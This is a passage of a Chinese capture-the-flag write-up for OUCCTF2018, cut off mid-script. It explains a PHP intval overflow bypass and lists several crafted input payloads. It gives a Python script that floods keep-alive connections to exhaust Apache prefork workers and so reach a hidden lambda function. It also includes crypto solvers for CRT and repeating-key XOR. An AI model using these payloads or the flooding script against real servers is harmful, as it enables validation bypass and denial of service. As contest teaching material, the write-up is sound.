class="line">&#125;</span><br></pre></td></tr></table></figure><p>即check函数在检查输入字符串是否是回文字符串，如果是则返回true，否则返回false。<br>那么在看上面的第四个条件，即该字符串不能是回文字符串，这就和第三个条件产生了冲突，因此该题突破点不是在第三个条件就是在第四个条件上。</p><blockquote><p>因为此题鄙人的设计不足，导致了很多非预期解（事实上只有一个队伍是按照预期解做的）</p></blockquote><p>鄙人直接讲一讲预期解的做法吧</p><p>首先需要知道PHP的底层是用C实现的，在C语言中关于数字的取值范围存在着一些问题，比如整数溢出<br>PHP中的intval函数的作用是将一个字符串转为数字，但是在32位系统最大带符号的int值2147483648，在64位系统上，最大带符号的int值是9223372036854775807。那么可以试想一下，如果给intval函数一个特别大的参数，它会返回什么？</p><p>在32位的系统上，intval(‘1000000000000’)会返回2147483647，可以发现当给intval的参数足够大的时候，它的返回值总是固定的，这样就可以绕过使用intval的判断语句，即只要输入的数大于等于9223372036854775807，intval函数总会返回9223372036854775807。</p><p>下面来处理回文问题。9223372036854775807经过strrev反转后是7085774586302733229，无法构成溢出，所以需要在9223372036854775807前面加一个0，反转之后为70857745863027332290，这个数就足够intval溢出了，拿到flag。</p><blockquote><p>flag{Wh4t_a_Mag1c_Numb3r}</p></blockquote><p>以下为其他队伍的非预期解</p><blockquote><p>0e-0 // 反转后经过intval处理还是0<br>00e0 // 原理同上<br>0.00 // 原理同上<br>010000000000.00000000001 // 反转前与反转后的intval都为10000000000<br>9223372036854775807.0000000000000000000000000000000000000001 // 也是利用了溢出，反转后的intval为1000000000000000000000000000000000000000，溢出得到9223372036854775807<br>%00%0c131 // 绕过trim和is_numeric，原理是虽然最开始用了trim去除周围的空白字符，但是PHP底层函数中trim的实现并没有包含\f（0x0c），而is_numeric函数在最开始会跳过传入参数的所有空白字符</p></blockquote><hr><h2 id="Lambda"><a href="#Lambda" class="headerlink" title="Lambda"></a>Lambda</h2><blockquote><p>Orange will help you.</p></blockquote><p>不知道Orange？Google一下“Orange CTF”<br>此题源自hitcon2015，Orange出的一道题最后一部分,这是Orange当年自己在PHP底层挖到的一个0day<br>虽然create_function创建了一个匿名函数，但是在PHP内部匿名函数也是有名字的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$func = create_function(<span class="string">""</span>,<span class="string">"echo 123;"</span>);</span><br><span class="line">var_dump($func);</span><br></pre></td></tr></table></figure><p><img src="/2018/06/11/OUCCTF2018-Partial-Writeup/TIM%E6%88%AA%E5%9B%BE20180612111100.png" alt></p><p>可以看到创建的匿名函数的名字为”\0lambda_1”<br>再看PHP源码中对匿名函数名称的处理</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">function_name = zend_string_alloc(<span class="keyword">sizeof</span>(<span class="string">"0lambda_"</span>)+MAX_LENGTH_OF_LONG, <span class="number">0</span>);</span><br><span class="line">ZSTR_VAL(function_name)[<span class="number">0</span>] = <span class="string">'\0'</span>; <span class="comment">// 匿名函数的第一位被替换为\0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line">ZSTR_LEN(function_name) = <span class="built_in">snprintf</span>(ZSTR_VAL(function_name) + <span class="number">1</span>, <span class="keyword">sizeof</span>(<span class="string">"lambda_"</span>)+MAX_LENGTH_OF_LONG, <span class="string">"lambda_%d"</span><span class="comment">/*匿名函数体为lambda_%d，%d被格式化为lambda_count+1*/</span>, ++EG(lambda_count)) + <span class="number">1</span>;</span><br><span class="line">&#125; <span class="keyword">while</span> (zend_hash_add_ptr(EG(function_table), function_name, func) == <span class="literal">NULL</span>);</span><br><span class="line">RETURN_NEW_STR(function_name);</span><br></pre></td></tr></table></figure><p>可以看到在匿名函数的最前面被替换为\0，中间为lambda_，最后由%d格式化，这个%d为匿名函数的个数+1，从1开始递增。</p><p>由于很多人都在同时做这个题，会同时创建很多个匿名函数，所以并不知道匿名函数的数量，也就不知道最后的%d被格式化到了多少，但是Apache中对于多进程有三种模式（prefork，worker和event），其中prefork为默认模式。现在来分析下Apache-prefork模式</p><p>prefork的意思为”预先创建进程”，其官方介绍如下</p><blockquote><p>From: <a href="https://httpd.apache.org/docs/2.4/mod/prefork.html" target="_blank" rel="noopener">https://httpd.apache.org/docs/2.4/mod/prefork.html</a><br>This Multi-Processing Module (MPM) implements a non-threaded, pre-forking web server. Each server process may answer incoming requests, and a parent process manages the size of the server pool. It is appropriate for sites that need to avoid threading for compatibility with non-thread-safe libraries. It is also the best MPM for isolating each request, so that a problem with a single request will not affect any other.<br>This MPM is very self-regulating, so it is rarely necessary to adjust its configuration directives. Most important is that MaxRequestWorkers be big enough to handle as many simultaneous requests as you expect to receive, but small enough to assure that there is enough physical RAM for all processes.</p></blockquote><p>Apache2.4中prefork模式下的参数如下<br><img src="/2018/06/11/OUCCTF2018-Partial-Writeup/TIM%E6%88%AA%E5%9B%BE20180612114126.png" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;IfModule mpm_prefork_module&gt;</span><br><span class="line">     StartServers        5 # 启动时默认开启的进程数</span><br><span class="line">     MinSpareServers      5 # 最少空闲进程数</span><br><span class="line">     MaxSpareServers       10 # 最大空闲进程数</span><br><span class="line">     MaxRequestWorkers     150 # 并发最大请求数</span><br><span class="line">     MaxConnectionsPerChild   0 # 每个子进程在生命周期内所能够服务的最多请求个数</span><br><span class="line">   &lt;&#x2F;IfModule&gt;</span><br></pre></td></tr></table></figure><p>当Apache启动后首先会启动StartServers个子进程，等待1秒后会再创建2个，再等待1秒后创建4个，以此类推直到创建到MinSpareServers个子进程为止，这些fork出的子进程会去等待用户连接，Apache以此加快了处理用户请求的速度。</p><p>但如果一个用户发送了大量的tcp请求，占满了所有的MaxRequestWorkers后，Apache在处理完所有的MaxConnectionsPerChild个tcp连接后会重新开启一个进程，而这个新的进程里的匿名函数的个数肯定是1，这时再去带上匿名函数的名称（%00lambda_1）去访问就能得到flag</p><blockquote><p>flag{An0nm0us_Func_1s_l4m6da}</p></blockquote><p>附Orange的fork脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding: UTF-8</span></span><br><span class="line"><span class="comment"># Author: orange@chroot.org</span></span><br><span class="line"><span class="comment"># /?func_name=%00lambda_1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> multiprocessing.dummy <span class="keyword">import</span> Pool <span class="keyword">as</span> ThreadPool</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    requests.packages.urllib3.disable_warnings()</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(i)</span>:</span></span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        HOST = <span class="string">'***.***.***.***'</span></span><br><span class="line">        PORT = *</span><br><span class="line">        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">        s.connect((HOST, PORT))</span><br><span class="line">        s.sendall(</span><br><span class="line">            <span class="string">'GET / HTTP/1.1\nHost: ***.***.***.***\nConnection: Keep-Alive\n\n'</span>)</span><br><span class="line">        <span class="comment"># s.close()</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">'ok'</span></span><br><span class="line">        time.sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">i = <span class="number">8</span></span><br><span class="line">pool = ThreadPool(i)</span><br><span class="line">result = pool.map_async(run, range(i)).get(<span class="number">0xffff</span>)</span><br></pre></td></tr></table></figure><hr><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="CRT"><a href="#CRT" class="headerlink" title="CRT"></a>CRT</h2><blockquote><p>What is CRT? PS: I like Sun Tzu!</p></blockquote><p>不知道什么是CRT？查一查。找不到和密码学有关的？Google “CRT Tzu”<br>此题主要考察了简单的中国剩余定理(孙子定理)<br>题目源码如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check_key</span><span class="params">(key)</span>:</span></span><br><span class="line">    <span class="keyword">assert</span> key.startswith(<span class="string">"flag&#123;"</span>) // key的开头是flag&#123;</span><br><span class="line">    <span class="keyword">assert</span> key.endswith(<span class="string">"&#125;"</span>) // key的结尾是&#125;</span><br><span class="line">    <span class="keyword">return</span> key[<span class="number">5</span>:<span class="number">-1</span>] // 最终的key为flag&#123;&#125;中括号之间的字符串</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate</span><span class="params">(a, b)</span>:</span></span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">"cipher.txt"</span>, <span class="string">"w"</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(b)):</span><br><span class="line">            f.write(str(a % b[i]) + <span class="string">"\n"</span>) // 用a模每一个b</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    key = check_key(flag.flag)</span><br><span class="line">    x = int(key.encode(<span class="string">"hex"</span>), <span class="number">16</span>) // key的<span class="number">16</span>进制</span><br><span class="line">    y = [</span><br><span class="line">        <span class="number">0x101</span>, <span class="number">0x107</span>, <span class="number">0x10d</span>, <span class="number">0x10f</span>, <span class="number">0x115</span>,</span><br><span class="line">        <span class="number">0x119</span>, <span class="number">0x11b</span>, <span class="number">0x125</span>, <span class="number">0x133</span>, <span class="number">0x137</span>,</span><br><span class="line">        <span class="number">0x139</span>, <span class="number">0x13d</span>, <span class="number">0x14b</span>, <span class="number">0x151</span>, <span class="number">0x15b</span>,</span><br><span class="line">        <span class="number">0x15d</span>, <span class="number">0x161</span>, <span class="number">0x167</span>, <span class="number">0x16f</span>, <span class="number">0x175</span></span><br><span class="line">    ]</span><br><span class="line">    generate(x, y)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>可以发现源码中将flag{}花括号中的字符串作为key，转成十六进制数字之后去模b中的每一个值，作为结果放入密文中，也就是要解20个同余方程，利用中国剩余定理求解即可<br>(不难判断出y数组中所有值都是两两互质的)</p><p>解题脚本如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># Author: Srpopty</span></span><br><span class="line"><span class="comment"># Time: 2018.6.12</span></span><br><span class="line"><span class="comment"># Chinese remainder theorem(CRT)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> reduce</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Euclidean_ex</span><span class="params">(a, b)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> b == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>, <span class="number">0</span>, a</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        x, y, q = Euclidean_ex(b, a % b)</span><br><span class="line">        x, y = y, (x - (a // b) * y)</span><br><span class="line">        <span class="keyword">return</span> x, y, q</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Int2Str</span><span class="params">(x)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> hex(int(x))[<span class="number">2</span>:<span class="number">-1</span>].decode(<span class="string">'hex'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    x = [</span><br><span class="line">        <span class="number">257</span>, <span class="number">263</span>, <span class="number">269</span>, <span class="number">271</span>,</span><br><span class="line">        <span class="number">277</span>, <span class="number">281</span>, <span class="number">283</span>, <span class="number">293</span>,</span><br><span class="line">        <span class="number">307</span>, <span class="number">311</span>, <span class="number">313</span>, <span class="number">317</span>,</span><br><span class="line">        <span class="number">331</span>, <span class="number">337</span>, <span class="number">347</span>, <span class="number">349</span>,</span><br><span class="line">        <span class="number">353</span>, <span class="number">359</span>, <span class="number">367</span>, <span class="number">373</span></span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line">    y = [</span><br><span class="line">        <span class="number">222</span>, <span class="number">82</span>,  <span class="number">47</span>,  <span class="number">96</span>,</span><br><span class="line">        <span class="number">197</span>, <span class="number">29</span>,  <span class="number">122</span>, <span class="number">197</span>,</span><br><span class="line">        <span class="number">25</span>,  <span class="number">8</span>,   <span class="number">135</span>, <span class="number">175</span>,</span><br><span class="line">        <span class="number">174</span>, <span class="number">149</span>, <span class="number">77</span>,  <span class="number">345</span>,</span><br><span class="line">        <span class="number">66</span>,  <span class="number">112</span>, <span class="number">279</span>, <span class="number">129</span></span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line">    M = reduce(<span class="keyword">lambda</span> a, b: a * b, x)</span><br><span class="line">    Mi = [M//m <span class="keyword">for</span> m <span class="keyword">in</span> x]</span><br><span class="line"></span><br><span class="line">    Ti = [Euclidean_ex(Mi[i], x[i])[<span class="number">0</span>] <span class="keyword">for</span> i <span class="keyword">in</span> range(len(x))]</span><br><span class="line"></span><br><span class="line">    result = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(x)):</span><br><span class="line">        result = (result + Mi[i] * Ti[i] * y[i]) % M</span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"flag&#123;%s&#125;"</span> % Int2Str(result)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><hr><h2 id="Poem"><a href="#Poem" class="headerlink" title="Poem"></a>Poem</h2><p>题目源码如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check_key</span><span class="params">(key)</span>:</span></span><br><span class="line">    <span class="keyword">assert</span> key.startswith(<span class="string">"flag&#123;"</span>)</span><br><span class="line">    <span class="keyword">assert</span> key.endswith(<span class="string">"&#125;"</span>)</span><br><span class="line">    key = key[<span class="number">5</span>:<span class="number">-1</span>]</span><br><span class="line">    <span class="keyword">assert</span> len(key) &gt; <span class="number">1</span> <span class="keyword">and</span> len(key) &lt; <span class="number">50</span></span><br><span class="line">    <span class="keyword">return</span> key <span class="comment"># key为flag中的字符串且key的长度大于1小于50</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check_plain</span><span class="params">(plain)</span>:</span></span><br><span class="line">    <span class="keyword">assert</span> re.match(<span class="string">'[A-Za-z\s]*'</span>, plain) <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span></span><br><span class="line">    <span class="keyword">return</span> plain <span class="comment"># 明文由英文字符和空白字符组成</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encryt</span><span class="params">(key, plain)</span>:</span></span><br><span class="line">    cipher = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(plain)):</span><br><span class="line"><span class="comment"># 用key去循环异或加密明文</span></span><br><span class="line">        cipher += chr(ord(key[i % len(key)]) ^ ord(plain[i]))</span><br><span class="line">    <span class="keyword">return</span> cipher</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_plain</span><span class="params">()</span>:</span></span><br><span class="line">    plain = <span class="string">""</span></span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">"plain.txt"</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            line = f.readline()</span><br><span class="line">            <span class="keyword">if</span> line:</span><br><span class="line">                plain += line</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> plain</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    key = check_key(flag.flag)</span><br><span class="line">    plain = check_plain(get_plain())</span><br><span class="line">    cipher = encryt(key, plain)</span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">"cipher.txt"</span>, <span class="string">"w"</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(cipher.encode(<span class="string">"base64"</span>)) <span class="comment"># 将加密后的密文base64编码</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>可以看到这段代码主要做的就是用同一个key去对明文循环循环，并且已知条件如下</p><ol><li>key的长度大于1小于50</li><li>明文由英文及空白字符组成</li><li>密文</li></ol><p>原理:<br>假设key为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">key &#x3D; &#39;xzy&#39;</span><br></pre></td></tr></table></figure><p>假设明文(plain)为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">plain &#x3D; &#39;abcdefg&#39;</span><br></pre></td></tr></table></figure><p>使用key对plain进行循环异或，则(假设密文为C)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">C[0] &#x3D; &#39;x&#39; ^ &#39;a&#39;</span><br><span class="line">C[1] &#x3D; &#39;y&#39; ^ &#39;b&#39;</span><br><span class="line">C[2] &#x3D; &#39;z&#39; ^ &#39;c&#39;</span><br><span class="line">C[3] &#x3D; &#39;x&#39; ^ &#39;d&#39;</span><br><span class="line">C[4] &#x3D; &#39;y&#39; ^ &#39;e&#39;</span><br><span class="line">C[5] &#x3D; &#39;z&#39; ^ &#39;f&#39;</span><br><span class="line">C[6] &#x3D; &#39;x&#39; ^ &#39;g&#39;</span><br></pre></td></tr></table></figure><p>整理一下（这里仅关注key的第一位’x’）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">C[0] &#x3D; &#39;x&#39; ^ &#39;a&#39;</span><br><span class="line">C[3] &#x3D; &#39;x&#39; ^ &#39;d&#39;</span><br><span class="line">C[6] &#x3D; &#39;x&#39; ^ &#39;g&#39;</span><br></pre></td></tr></table></figure><p>根据异或的性质得</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#39;a&#39; &#x3D; &#39;x&#39; ^ C[0]</span><br><span class="line">&#39;d&#39; &#x3D; &#39;x&#39; ^ C[3]</span><br><span class="line">&#39;g&#39; &#x3D; &#39;x&#39; ^ C[6]</span><br></pre></td></tr></table></figure><p>现在我们已知C，并且知道明文(‘a’,’b’,’c’这些)的字符集<br>假设k为密钥，p为明文，C为密文</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">p[0] &#x3D; k[0] ^ C[0]</span><br><span class="line">p[3] &#x3D; k[0] ^ C[3]</span><br><span class="line">p[6] &#x3D; k[0] ^ C[6]</span><br></pre></td></tr></table></figure><p>穷举有所k的长度(理论上从1到无穷，题目中告诉了从1到50)，在每一个k长度中对k的每一个字符进行穷举（从0到255）<br>k中每个字符与C中对应字符进行异或，计算出明文p，看p中多少字符在已知的明文字符集中，利用字频分析确定该穷举出的结果是否最优，穷举结束后取最优的一次穷举结果<br>理论上越接近key的真实长度，解密出的明文字符集越接近真实明文字符集</p><p>解题脚本如下（字频分析法的变种）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># Author: Srpopty</span></span><br><span class="line"><span class="comment"># Time: 2018.6.12</span></span><br><span class="line"><span class="comment"># Exploit of Poem</span></span><br><span class="line"><span class="keyword">from</span> string <span class="keyword">import</span> ascii_letters</span><br><span class="line"></span><br><span class="line">VaildChar = ascii_letters + <span class="string">' \n,.'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">GetFreq</span><span class="params">(string)</span>:</span></span><br><span class="line">    freq = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> ch <span class="keyword">in</span> string:</span><br><span class="line">        freq += <span class="number">1</span> <span class="keyword">if</span> ch <span class="keyword">in</span> VaildChar <span class="keyword">else</span> <span class="number">0</span></span><br><span class="line">    <span class="keyword">return</span> freq</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">GetCipher</span><span class="params">(filename)</span>:</span></span><br><span class="line">    <span class="keyword">with</span> open(filename, <span class="string">'rb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">return</span> (<span class="string">''</span>.join([line <span class="keyword">for</span> line <span class="keyword">in</span> f.readlines()])).decode(<span class="string">'base64'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">GetPlainFromPool</span><span class="params">(pool, cipher)</span>:</span></span><br><span class="line">    pool_length = len(pool)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">''</span>.join([pool[i % pool_length][i / pool_length] <span class="keyword">for</span> i <span class="keyword">in</span> range(len(cipher))])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">DecryptPool</span><span class="params">(cipher)</span>:</span></span><br><span class="line">    plain = <span class="string">''</span></span><br><span class="line">    key = <span class="string">''</span></span><br><span class="line">    freq = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> ch <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">        _plain = <span class="string">''</span>.join([chr(ord(c) ^ ch) <span class="keyword">for</span> c <span class="keyword">in</span> cipher])</span><br><span class="line">        _freq = GetFreq(_plain)</span><br><span class="line">        <span class="keyword">if</span> _freq &gt; freq:</span><br><span class="line">            plain, freq, key = _plain, _freq, chr(ch)</span><br><span class="line">    <span class="keyword">return</span> plain, key, freq</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Decrypt</span><span class="params">(key_size, cipher)</span>:</span></span><br><span class="line">    cipher_pool = [<span class="string">""</span>] * key_size</span><br><span class="line">    plain_pool = cipher_pool[:]</span><br><span class="line">    key = <span class="string">''</span></span><br><span class="line">    freq = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(cipher)):</span><br><span class="line">        cipher_pool[i % key_size] += cipher[i]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(key_size):</span><br><span class="line">        plain_pool[i], _key, _freq = DecryptPool(cipher_pool[i])</span><br><span class="line">        freq += _freq</span><br><span class="line">        key += _key</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> GetPlainFromPool(plain_pool, cipher), key, 